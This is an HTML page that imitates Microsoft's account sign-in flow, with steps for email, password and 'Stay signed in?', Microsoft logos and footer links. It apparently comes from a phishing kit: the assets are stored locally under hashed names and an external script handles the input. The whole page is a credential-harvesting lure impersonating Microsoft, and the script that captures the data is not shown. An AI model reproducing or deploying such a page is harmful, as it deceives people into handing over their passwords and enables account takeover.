<!DOCTYPE html>

<html lang="en">
<head>
<meta charset="utf-8"/>
<meta content="IE=edge" http-equiv="X-UA-Compatible"/>
<meta content="width=device-width, initial-scale=1.0" name="viewport"/>
<link href="local_resources/img/29bab68dd9b77e5cc9bc48291370fe43.ico" rel="icon"/>
<title>Sign in to your Microsoft account</title>
<link href="local_resources/css/0cd21a9c9f4d6dbaced85dc936bcd9ca.css" rel="stylesheet"/>
</head>
<body>
<section id="section_uname">
<div class="auth-wrapper">
<img alt="Microsoft" src="local_resources/img/50e148e808e253bf20ea2141113ef08f.png"/>
<h2 class="title mb-16 mt-16">Sign in</h2>
<form>
<div class="mb-16">
<p class="error" id="error_uname"></p>
<input class="input" id="inp_uname" name="uname" placeholder="Email, phone, or Skype" type="text"/>
</div>
</form>
<div>
<p class="mb-16 fs-13">No account? <a class="link" href="">Create one!</a></p>
<p class="mb-16 fs-13">
<a class="link" href="#">Sign in with a security key
                        <img alt="Question img" src="local_resources/img/8700f7bcfc04f5becc4fa3eb496696b3.png"/>
</a>
</p>
</div>
<div>
<button class="btn" id="btn_next">Next</button>
</div>
</div>
<div class="opts">
<p class="has-icon mb-0" style="font-size:15px;"><span class="icon"><img src="local_resources/img/064abd887ae9dd0048feb4b26db84e99.png" width="30px"/></span> Sign-in options</p>
</div>
</section>
<section class="d-none" id="section_pwd">
<div class="auth-wrapper">
<img alt="Microsoft" class="d-block" src="local_resources/img/50e148e808e253bf20ea2141113ef08f.png"/>
<div class="identity w-100 mt-16 mb-16">
<button class="back">
<img src="local_resources/img/2014fb4fdecbb3abbe3c84b5cfe9e460.png"/>
</button>
<span id="user_identity">a@b.com</span>
</div>
<h2 class="title mb-16">Enter password</h2>
<form>
<div class="mb-16">
<p class="error" id="error_pwd"></p>
<input class="input" id="inp_pwd" name="pass" placeholder="Password" type="password"/>
</div>
</form>
<div>
<p class="mb-16"> <a class="link fs-13" href="#">Forgot password?</a></p>
<p class="mb-16">
<a class="link fs-13" href="#">Other ways to sign in</a>
</p>
</div>
<div>
<button class="btn" id="btn_sig">Sign in</button>
</div>
</div>
</section>
<section class="d-none" id="section_final">
<div class="auth-wrapper">
<img alt="Microsoft" class="d-block" src="local_resources/img/50e148e808e253bf20ea2141113ef08f.png"/>
<div class="identity w-100 mt-16 mb-16">
<span id="user_identity">a@b.com</span>
</div>
<h2 class="title mb-16">Stay signed in?</h2>
<p class="p">Stay signed in so you don't have to sign in again next time.</p>
<label class="has-checkbox">
<input class="checkbox" type="checkbox"/>
<span>Don't show this again</span>
</label>
<div class="btn-group">
<button class="btn btn-sec" id="btn_final">No</button>
<button class="btn" id="btn_final">Yes</button>
</div>
</div>
</section>
<footer class="footer">
<a href="#">Terms of use</a>
<a href="#">Privacy &amp; cookies</a>
<span>. . .</span>
</footer>
<script src="local_resources/js/b835b89971fc69a5bf7a03d5c4068077.js"></script>
</body>
</html>
